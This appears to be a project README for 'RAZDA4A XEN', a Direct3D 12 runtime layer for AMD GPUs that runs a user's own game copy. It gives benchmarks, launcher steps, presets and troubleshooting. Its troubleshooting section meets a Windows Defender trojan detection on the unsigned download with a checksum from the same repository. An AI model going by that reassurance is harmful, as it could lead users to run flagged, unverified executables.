<p align="center">
  <span style="font-size:64px">🦋</span>
</p>

<h1 align="center">RAZDA4A XEN</h1>

<p align="center">
  Direct3D 12 runtime for AMD RDNA.<br>
  <b>Wave 11</b> · <b>~31 native / 62-63 FG</b>
</p>

<p align="center">
  <img alt="Release: Wave 11" src="https://img.shields.io/badge/release-Wave%2011-2ea44f">
  <a href="https://github.com/crossducking/RAZDA4A-XEN/archive/refs/heads/main.zip"><img alt="Download the main branch ZIP" src="https://img.shields.io/badge/download-main%20ZIP-0969da"></a>
  <a href="LICENSE"><img alt="License GPL-3.0-or-later" src="https://img.shields.io/badge/license-GPL--3.0--or--later-blue"></a>
  <img alt="Windows 10/11 and Linux via Proton" src="https://img.shields.io/badge/platform-Windows%2010%2F11%20%7C%20Linux%20Proton-informational">
</p>

<p align="center">
  English ·
  <a href="README.ru.md">Русский</a> ·
  <a href="README.zh.md">简体中文</a> ·
  <a href="README.es.md">Español</a> ·
  <a href="README.pt-BR.md">Português (BR)</a>
</p>

## Results

| | |
|---|---|
| **Release** | Wave 11 (`main`) |
| **Machine** | Radeon RX 9060 XT + Ryzen 7 7800X3D |
| **FPS** | **~31 native / 62-63 FG** |

`62-63 FG` is frame generation. Native is ~31.

8 GB cards run in Safe Mode. An RX 7600 measured **12.7 native / 24.86 FG**. Tables: [Performance](docs/en/performance.md).

## Quick start

This repo has no game files. Use your own copy.

1. Download [main.zip](https://github.com/crossducking/RAZDA4A-XEN/archive/refs/heads/main.zip) or `git clone --branch main https://github.com/crossducking/RAZDA4A-XEN.git`, then extract it.
2. Start **`RAZDA4A_XEN.exe`** or **`RAZDA4A XEN.bat`**.
3. In the launcher, choose your game `.exe`, a profile, and frame generation, then **Launch**.

Do not run the game executable directly. The runtime starts only through the launcher.

`F2` or `~` toggles mouse-look (`Esc` releases the cursor). `F3` toggles the FPS readout.

Linux uses `launch_linux_proton.sh`. Presets and the Linux steps: [How to run](docs/en/running.md).

## Requirements

| | Wave 11 |
|---|---|
| **GPU** | AMD RDNA2 / RDNA3 / RDNA4 (RX 6000 / 7000 / 9000), DX12 Ultimate and mesh shaders |
| **CPU** | x86-64-v3 (AMD Zen 2–5, Intel Haswell through Arrow Lake) |
| **Memory** | 16 GB RAM on an SSD. Tight commit: 24–32 GB pagefile (`pagefile_16gb_ram.ps1`). 8–12 GB VRAM: Safe Mode |
| **OS** | Windows 10 / 11, or Linux with Proton / VKD3D-Proton |
| **Not this build** | NVIDIA, Intel Arc, RDNA1, GTX 10/16, 4 GB-class cards, HDDs |

An NVIDIA version is coming. AMD shipped first. Until then: [trustno1-coder/VIctory-NVIDIA](https://github.com/trustno1-coder/VIctory-NVIDIA).

## Presets

| File | Use |
|---|---|
| `RAZDA4A XEN.bat` | Launcher window: game `.exe`, frame generation, Safe Mode on 8 GB |
| `presets\1_Low_Commit_NVMe_16GB.bat` | 16 GB RAM, NVMe-backed pages |
| `presets\2_Max_FPS_Experimental_CBV.bat` | Balanced, plus in-place constant buffers |
| `presets\3_Native_No_FG_Zero_Latency.bat` | Native only, frame generation off |
| `presets\4_Safe_Mode_8GB_12GB_VRAM.bat` | 8–12 GB VRAM |

## FAQ

<details>
<summary>Does this include the game?</summary>

No. Bring your own copy. A leaked GDK is not required. This repo does not link to game downloads.
</details>

<details>
<summary>NVIDIA or Intel Arc?</summary>

Wave 11 is AMD RDNA. An NVIDIA version is coming. AMD shipped first. The community fork is linked above. Intel Arc is not supported. Any non-AMD adapter can black-screen or crash.
</details>

<details>
<summary>8 GB of VRAM, or less?</summary>

8–12 GB: Safe Mode (preset 4, or the launcher picks it up on 8 GB). RX 7600: 12.7 native / 24.86 FG. 6 GB and below is not a supported configuration. RDNA1 and GTX 10/16 do not have the mesh shaders this build needs.
</details>

<details>
<summary>Ray tracing?</summary>

Off in Wave 11. The ray-tracing structure builder does not run.
</details>

<details>
<summary>Hard drive, or 16 GB of RAM?</summary>

An HDD is not supported. Use an NVMe or SATA SSD. On 16 GB RAM, `pagefile_16gb_ram.ps1` or preset 1 covers a tight pagefile.
</details>

## Troubleshooting

- The first launch compiles pipelines (about 1–3 minutes of stutter). Quit, run `warm_shaders.bat` once, then start again from the launcher.
- Windows Defender may flag the unsigned ZIP as `Trojan:Script/Wacatac.H!ml`. Compare `RAZDA4A_XEN.exe` with [SHA256SUMS.txt](SHA256SUMS.txt): `4ab8fcf7e2614cb669ad54069011d8cb0bed74b3eac7b994854c278f2a862622`.
- `collect_logs.bat`, or **Export Logs** in the launcher, writes `logs\bug_report_*.txt` on this PC.
- Linux stuck near 1 FPS or a blank image: use `launch_linux_proton.sh`, which stops the bundled `D3D12Core.dll` from replacing vkd3d-proton.

[How to run](docs/en/running.md) · [Security and building](docs/en/security-and-build.md)

## About

RAZDA4A XEN is an open-source Direct3D 12 layer aimed at 16 GB RAM, 6-core CPUs, and 8–16 GB of VRAM. Wave 11 on `main` is the launcher, presets, DLLs, and these pages. The Rust source is on [`dev`](https://github.com/crossducking/RAZDA4A-XEN/tree/dev).

## Credits

- [VIctory](https://github.com/Marvisak/VIctory) by Marvisak, upstream, under GPL-3.0-or-later ([LICENSE](LICENSE)).
- `nathanbzrr` — 8 GB Safe Mode, shipped on `main`.
- [trustno1-coder/VIctory-NVIDIA](https://github.com/trustno1-coder/VIctory-NVIDIA) — community NVIDIA fork.

## Documentation

- [Performance](docs/en/performance.md)
- [How to run](docs/en/running.md)
- [Hardware](docs/en/hardware.md)
- [What Wave 11 ships](docs/en/technical-changes.md)
- [Known limits](docs/en/known-limits.md)
- [Security, checksums, and building](docs/en/security-and-build.md)
- [Branches and license](docs/en/project.md)
